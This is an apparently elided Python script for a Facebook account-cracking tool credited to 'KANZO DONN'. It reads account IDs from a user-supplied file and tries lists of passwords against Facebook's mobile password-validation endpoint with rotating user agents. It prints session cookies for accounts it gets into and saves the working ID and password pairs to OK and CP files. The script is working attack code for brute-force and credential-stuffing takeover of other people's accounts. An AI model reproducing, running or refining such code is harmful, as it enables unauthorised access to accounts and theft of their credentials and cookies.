...
princp=[]
try:
    prox= requests.get('https://github.com/KANZOdonn1/KANZOxDON1-.git').text
...
def uaku():
    try:
        ...
        a=requests.get('https://github.com/KANZOdonn1/KANZOxDON1-.git').text
        ua=open('bbnew.txt','w')
...
def back():
    login()
def contact():
   # os.system('xdg-open https://chat.whatsapp.com/CSRoeLcSOt827h8wkCiRYd')
    back()
def linex():
    print('\033[1;37m')
def animation(u):
...
\033[1;37m------------------------------------------------
\033[1;32m[\033[1;32m✓] \033[1;36mAUTHOR      :\033[1;32m KANZO DONN
\033[1;32m[\033[1;32m✓] \033[1;36mTYPE        :\033[1;33m FREE
\033[1;32m[\033[1;32m✓] \033[1;36mREGION      :\033[1;34m NEPAL
\033[1;32m[\033[1;32m✓] \033[1;36mTOOLS TYPE  :\033[1;31m FILE CLONING Only 
\033[1;37m----------------------------------------------""")
...
os.system('espeak -a 300 " Welcome,   to,  KANZO,  DON,  Tools"')
pass
...
def menu():
    ...
    if KANZO in ['111']:
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=61555691551350')
        os.system("python nono.py")
    elif KANZO in ['3','03']:
        result()
    elif KANZO in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/KANZO.txt  Etc...]')
...
def setting():
    ...
    print("\033[97;1m[\033[92;1m2\033[97;1m] METHOD 3 [\033[0;93mCp id Show\033[1;37m]")
    print('\033[0;91m==================')
...
def passwrd():
    ...
    print("\033[97;1mJAY KANZO VAN SPEED UP KO LAGI")
    print('\033[0;97m===============================================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}•[KANZOM1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[KANZO-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[KANZO-Ok] {idf} • {pw}\n\033[0;93m[🍪]= COOKIES • \033[0;92m{kuki} ')
                os.system('espeak -a 300 " KANZO,  Ok,  id"')
...
def crackfree(idf,pwv):
    global loop,ok,cp
    sys.stdout.write(f"\r{H}[KANZO-M2]{P} [{H}{loop}{P}]{P}>~<[{H}{len(id)}{P}]-[OK{P}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]  "),
    sys.stdout.flush()
    ua = random.choice(ugen)
    ua2 = random.choice(ugen2)
    ses = requests.Session()
    for pw in pwv:
        try:
            ...
            po = ses.post('https://m.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,cookies={'cookie': koki},headers=heade,allow_redirects=False)
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;95m[{time.strftime("%H:%M")}•KANZO-Cp] {idf} • {pw}')
                os.system('espeak -a 300 " Cp,"')
                open('CP/'+cpc,'a').write(idf+' • '+pw+'\n')
                akun.append(idf+' • '+pw)
                cp+=1
                ...
                coki=po.cookies.get_dict()
                kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                print(f'\r\033[10;92m[{time.strftime("%H:%M")}•KANZO-Ok] {idf} • {pw} ')
                os.system('espeak -a 300 " Ok,  KANZO,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
